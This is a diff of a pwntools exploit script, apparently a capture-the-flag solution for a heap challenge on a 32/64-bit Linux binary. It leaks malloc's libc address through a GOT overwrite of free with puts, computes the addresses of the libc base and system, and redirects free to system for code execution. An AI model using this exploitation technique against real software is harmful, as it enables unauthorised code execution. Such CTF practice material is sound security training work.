@@ -1,11 +1,6 @@
 from pwn import *
 import sys
 
-#import kmpwn
-#sys.path.append('/home/vagrant/kmpwn')
-#from kmpwn import *
-#fsb(width, offset, data, padding, roop)
-
 #config
 context(os='linux', arch='i386')
 context.log_level = 'debug'
@@ -26,21 +21,13 @@ else:
 
 elf = ELF(FILE_NAME)
 plt_puts = elf.plt["puts"]
-plt_printf = elf.plt["printf"]
-plt_atoi = elf.plt["atoi"]
 
 got_free = elf.got["free"]
 got_malloc = elf.got["malloc"]
-got_puts = elf.got["puts"]
 
 libc = ELF('./libc-2.23.so')
 off_malloc = libc.symbols["malloc"]
 off_system = libc.symbols["system"]
-#
-#main_addr = elf.symbols["main"]
-#libc_binsh = next(elf.search("/bin/sh"))
-#addr_bss = elf.bss()
-#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
 
 ptr = 0x6021a0
 
@@ -75,18 +62,17 @@ def exploit():
 
 	write(3, note3)
 	put(4)
-	#
-	#write(3, p64(got_free))
+	
 	write(3, p64(got_free-8))
 	write(0, p64(plt_puts)+p64(plt_puts)[:-1])
 
 	write(3, p64(got_malloc))
 	put(0)
+	
 	libc_malloc = conn.recvline()[:-1]
 	libc_malloc = u64(libc_malloc+"\x00"*(8-len(libc_malloc)))
 	libc_base = libc_malloc - off_malloc
 	libc_system = libc_base + off_system
-	print(hex(libc_base))
 	
 	write(3, p64(got_free-8))
 	write(0, p64(libc_system)+p64(libc_system)[:-1])
